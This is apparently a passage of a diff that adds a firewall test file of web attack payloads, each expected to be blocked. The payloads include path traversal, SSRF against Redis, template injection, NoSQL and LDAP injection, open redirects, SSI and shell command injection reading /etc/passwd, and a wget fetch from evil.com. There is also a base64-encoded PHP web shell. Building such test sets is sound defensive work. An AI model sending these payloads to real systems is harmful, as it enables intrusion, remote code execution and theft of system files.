+      "COOKIE": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
+      "USER-AGENT": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
+      "REFERER": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
+      "HEADER": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "SSRF": [
+    {
+      "ARGS": "url=file:///e??/pa??wd",
+      "BODY": "url=file:///e??/pa??wd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php",
+      "BODY": "url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php",
+      "BODY": "url=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=file:///etc/passwd?/../passwd",
+      "BODY": "url=file:///etc/passwd?/../passwd",
+      "COOKIE": "file:///etc/passwd?/../passwd",
+      "USER-AGENT": "file:///etc/passwd?/../passwd",
+      "REFERER": "file:///etc/passwd?/../passwd",
+      "HEADER": "file:///etc/passwd?/../passwd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=file:/etc/passwd%3F/",
+      "BODY": "url=file:/etc/passwd%3F/",
+      "COOKIE": "file:/etc/passwd%3F/",
+      "USER-AGENT": "file:/etc/passwd%3F/",
+      "REFERER": "file:/etc/passwd%3F/",
+      "HEADER": "file:/etc/passwd%3F/",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=file:/etc%252Fpasswd/",
+      "BODY": "url=file:/etc%252Fpasswd/",
+      "COOKIE": "file:/etc%252Fpasswd/",
+      "USER-AGENT": "file:/etc%252Fpasswd/",
+      "REFERER": "file:/etc%252Fpasswd/",
+      "HEADER": "file:/etc%252Fpasswd/",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=file:/etc%252Fpasswd%3F/",
+      "BODY": "url=file:/etc%252Fpasswd%3F/",
+      "COOKIE": "file:/etc%252Fpasswd%3F/",
+      "USER-AGENT": "file:/etc%252Fpasswd%3F/",
+      "REFERER": "file:/etc%252Fpasswd%3F/",
+      "HEADER": "file:/etc%252Fpasswd%3F/",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=file:///etc/%3F/../passwd",
+      "BODY": "url=file:///etc/%3F/../passwd",
+      "COOKIE": "file:///etc/%3F/../passwd",
+      "USER-AGENT": "file:///etc/%3F/../passwd",
+      "REFERER": "file:///etc/%3F/../passwd",
+      "HEADER": "file:///etc/%3F/../passwd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "SSTI": [
+    {
+      "ARGS": "login%RND%=%24%7B7*7%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "BODY": "login%RND%=%24%7B7*7%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "COOKIE": "%24%7B7*7%7D",
+      "HEADER": "%24%7B7*7%7D",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%RND%=%24%7Bclass.getClassLoader()%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "BODY": "login%RND%=%24%7Bclass.getClassLoader()%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%RND%=${T(java.lang.System).getenv()}&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "BODY": "login%RND%=${T(java.lang.System).getenv()}&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "COOKIE": "${T(java.lang.System).getenv()}",
+      "HEADER": "${T(java.lang.System).getenv()}",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%RND%=%7B%24smarty.version%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "BODY": "login%RND%=%7B%24smarty.version%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "COOKIE": "%7B%24smarty.version%7D",
+      "HEADER": "%7B%24smarty.version%7D",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%RND%%253D%2524%257B%255C%2522freemarker.template.utility.Execute%255C%2522%253Fnew()(%255C%2522id%255C%2522)%257D%2526passw%253Dhij3kfmedfekmkm%2526token%253Dfdawgk2mnjdnwidfkamjn2i%2526sort%253Dtrue",
+      "BODY": "login%RND%%253D%2524%257B%255C%2522freemarker.template.utility.Execute%255C%2522%253Fnew()(%255C%2522id%255C%2522)%257D%2526passw%253Dhij3kfmedfekmkm%2526token%253Dfdawgk2mnjdnwidfkamjn2i%2526sort%253Dtrue",
+      "COOKIE": "%2524%257B%255C%2522freemarker.template.utility.Execute%255C%2522%253Fnew()(%255C%2522id%255C%2522)%257D",
+      "HEADER": "%2524%257B%255C%2522freemarker.template.utility.Execute%255C%2522%253Fnew()(%255C%2522id%255C%2522)%257D",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%RND%=%7B%7B%20someString.toUPPERCASE()%20%7D%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "BODY": "login%RND%=%7B%7B%20someString.toUPPERCASE()%20%7D%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "COOKIE": "%7B%7B%20someString.toUPPERCASE()%20%7D%7D",
+      "HEADER": "%7B%7B%20someString.toUPPERCASE()%20%7D%7D",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%RND%=%7B%7Brequest.__class__%7D%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "BODY": "login%RND%=%7B%7Brequest.__class__%7D%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "COOKIE": "%7B%7Brequest.__class__%7D%7D",
+      "HEADER": "%7B%7Brequest.__class__%7D%7D",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%RND%=%7B%7B'someString'.toUpperCase()%7D%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "BODY": "login%RND%=%7B%7B'someString'.toUpperCase()%7D%7D&passw=hij3kfmedfekmkm&token=fdawgk2mnjdnwidfkamjn2i&sort=true",
+      "COOKIE": "%7B%7B'someString'.toUpperCase()%7D%7D",
+      "HEADER": "%7B%7B'someString'.toUpperCase()%7D%7D",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "NoSQLi": [
+    {
+      "ARGS": "username[$ne]=1&password[$ne]=1",
+      "BODY": "username[$ne]=1&password[$ne]=1",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^md\" }}",
+      "JSON": true,
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "username[$ne]=toto&password[$regex]=m.{2}",
+      "BODY": "username[$ne]=toto&password[$regex]=m.{2}",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}",
+      "JSON": true,
+      "BLOCKED": true
+    },
+    {
+      "BODY": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "JSON": true,
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto",
+      "BODY": "login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "login%255B%2524gt%255D%3Dadmin%26login%255B%2524lt%255D%3Dtest%26pass%255B%2524ne%255D%3D1",
+      "BODY": "llogin%255B%2524gt%255D%3Dadmin%26login%255B%2524lt%255D%3Dtest%26pass%255B%2524ne%255D%3D1",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "username%255B%2524ne%255D%3Dtoto%26password%255B%2524ne%255D%3Dtoto",
+      "BODY": "username%255B%2524ne%255D%3Dtoto%26password%255B%2524ne%255D%3Dtoto",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "OR": [
+    {
+      "ARGS": "%25253Ciframe%252520width%25253D%252522560%252522%252520height%25253D%252522315%252522%252520src%25253D%252522https%25253A%25252F%25252Fexample.com%25253Fredir%25253Dhttps%25253A%25252F%25252Fevil.com%25252Fiframexss.html%252522%25253E%25253C%25252Fiframe%25253E",
+      "BODY": "%25253Ciframe%252520width%25253D%252522560%252522%252520height%25253D%252522315%252522%252520src%25253D%252522https%25253A%25252F%25252Fexample.com%25253Fredir%25253Dhttps%25253A%25252F%25252Fevil.com%25252Fiframexss.html%252522%25253E%25253C%25252Fiframe%25253E",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=@google.com",
+      "BODY": "url=@google.com",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=///google.com",
+      "BODY": "url=///google.com",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=javascript%3A%2F%2Fhttps%3A%2F%2Fexample.com%2F%3Fz%3D%250Aalert(1)",
+      "BODY": "url=javascript%3A%2F%2Fhttps%3A%2F%2Fexample.com%2F%3Fz%3D%250Aalert(1)",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=http://[::ffff:216.58.214.206]",
+      "BODY": "url=http://[::ffff:216.58.214.206]",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=http://example.com@[::ffff:216.58.214.206]",
+      "BODY": "url=http://example.com@[::ffff:216.58.214.206]",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=java%0d%0ascript%0d%0a:alert(0)",
+      "BODY": "url=java%0d%0ascript%0d%0a:alert(0)",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "url=javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)",
+      "BODY": "url=javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "LDAP": [
+    {
+      "ARGS": "param%RND%=%2A%29%28uid=%2A%29%29%28%7C%28uid=%2A",
+      "BODY": "param%RND%=%2A%29%28uid=%2A%29%29%28%7C%28uid=%2A",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "%2A%29%29%2500",
+      "BODY": "%2A%29%29%2500",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "%29%28cn%3D%29%29%5Cx00",
+      "BODY": "%29%28cn%3D%29%29%5Cx00",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "%2A%28%7C%28objectclass%3D%2A%29%29",
+      "BODY": "%2A%28%7C%28objectclass%3D%2A%29%29",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A",
+      "BODY": "%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "admin%2A%29%28%28%7Cuserpassword%3D%2A%29",
+      "BODY": "admin%2A%29%28%28%7Cuserpassword%3D%2A%29",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y",
+      "BODY": "x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "param%RND%=admin%2A%29%28%28%7Cuserpassword=%2A%29",
+      "BODY": "param%RND%=admin%2A%29%28%28%7Cuserpassword=%2A%29",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "RFI": [
+    {
+      "ARGS": "param%RND%=%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
+      "BODY": "param%RND%=%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "param%RND%=I@kdo9ijegieokf,kinkokdw0&login=admin&_token=ifwkaw-9ri0ofigjo9fgkiwn9df2o0kf0w9tgk30&coman=php://filter/read=string.rot13/resource=http://evil.com/index.php&parm2=fdna9rkif2ndfkigfji89rkfj29rk0hg3j98yhfile=login.php&password=fawikfiawgfiawkgiwaigkoiwg",
+      "BODY": "param%RND%=I@kdo9ijegieokf,kinkokdw0&login=admin&_token=ifwkaw-9ri0ofigjo9fgkiwn9df2o0kf0w9tgk30&coman=php://filter/read=string.rot13/resource=http://evil.com/index.php&parm2=fdna9rkif2ndfkigfji89rkfj29rk0hg3j98yhfile=login.php&password=fawikfiawgfiawkgiwaigkoiwg",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+      "BODY": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+      "REFERER": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "page=php://filter/read=string.rot13/resource=http://evil.com/index.php",
+      "BODY": "page=php://filter/read=string.rot13/resource=http://evil.com/index.php",
+      "COOKIE": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+      "USER-AGENT": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+      "REFERER": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+      "HEADER": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "param%RND%=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+      "BODY": "param%RND%=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+      "COOKIE": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+      "USER-AGENT": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+      "HEADER": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "page=php://filter/zlib.deflate/convert.base64-encode/resource=/e\\t\\c/pa\\s\\swd",
+      "BODY": "page=php://filter/zlib.deflate/convert.base64-encode/resource=/e\\t\\c/pa\\s\\swd",
+      "COOKIE": "page=php://filter/zlib.deflate/convert.base64-encode/resource=/e\\t\\c/pa\\s\\swd",
+      "USER-AGENT": "page=php://filter/zlib.deflate/convert.base64-encode/resource=/e\\t\\c/pa\\s\\swd",
+      "REFERER": "page=php://filter/zlib.deflate/convert.base64-encode/resource=/e\\t\\c/pa\\s\\swd",
+      "HEADER": "page=php://filter/zlib.deflate/convert.base64-encode/resource=/e\\t\\c/pa\\s\\swd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "SSI": [
+    {
+      "URL": "%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+      "ARGS": "param%RND%=%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+      "BODY": "param%RND%=%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+      "COOKIE": "%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+      "USER-AGENT": "%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+      "REFERER": "%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+      "HEADER": "%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+      "ARGS": "param%RND%=%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+      "BODY": "param%RND%=%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+      "COOKIE": "%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+      "USER-AGENT": "%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+      "REFERER": "%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+      "HEADER": "%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+      "ARGS": "param%RND%=%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+      "BODY": "param%RND%=%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+      "COOKIE": "%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+      "USER-AGENT": "%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+      "REFERER": "%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+      "HEADER": "%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+      "ARGS": "param%RND%=%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+      "BODY": "param%RND%=%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+      "COOKIE": "%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+      "USER-AGENT": "%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+      "REFERER": "%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+      "HEADER": "%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+      "ARGS": "param%RND%=%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+      "BODY": "param%RND%=%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+      "COOKIE": "%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+      "USER-AGENT": "%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+      "REFERER": "%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+      "HEADER": "%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "CM": [
+    {
+      "URL": "${7*7}",
+      "ARGS": "${7*7}",
+      "BODY": "${7*7}",
+      "COOKIE": "${7*7}",
+      "USER-AGENT": "${7*7}",
+      "REFERER": "${7*7}",
+      "HEADER": "${7*7}",
+      "METHOD": "SPST",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "; cat /etc/passwd",
+      "ARGS": "; cat /etc/passwd",
+      "BODY": "; cat /etc/passwd",
+      "COOKIE": "; cat /etc/passwd",
+      "USER-AGENT": "; cat /etc/passwd",
+      "REFERER": "; cat /etc/passwd",
+      "HEADER": "; cat /etc/passwd",
+      "METHOD": "SPST",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "ARGS": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "BODY": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "COOKIE": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "USER-AGENT": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "REFERER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "HEADER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "METHOD": "SPST",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "ARGS": "param%RND%=%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "BODY": "param%RND%=%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "COOKIE": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "USER-AGENT": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "REFERER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "HEADER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "METHOD": "SPST",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+      "ARGS": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+      "BODY": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+      "COOKIE": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+      "USER-AGENT": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+      "REFERER": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+      "HEADER": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+      "METHOD": "SPST",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "ARGS": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "BODY": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "COOKIE": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "USER-AGENT": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "REFERER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "HEADER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "METHOD": "GET",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "ARGS": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "BODY": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "COOKIE": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "USER-AGENT": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "REFERER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "HEADER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "METHOD": "HEAD",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "ARGS": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "BODY": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "COOKIE": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "USER-AGENT": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "REFERER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "HEADER": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+      "METHOD": "OPTIONS",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "UWA": [
+    {
+      "URL": "/.git",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/wp-settings.php.swp",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/.suspected",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/wso.php",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/%2e/dmp.sql",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/%2e/backup.zip",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/%2e/config.php.bak",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/do.php%23.png",
+      "ENCODE": "",
+      "BLOCKED": true
+    }
+  ],
+  "GraphQL": [
+    {
+      "ARGS": "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}",
+      "BODY": "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++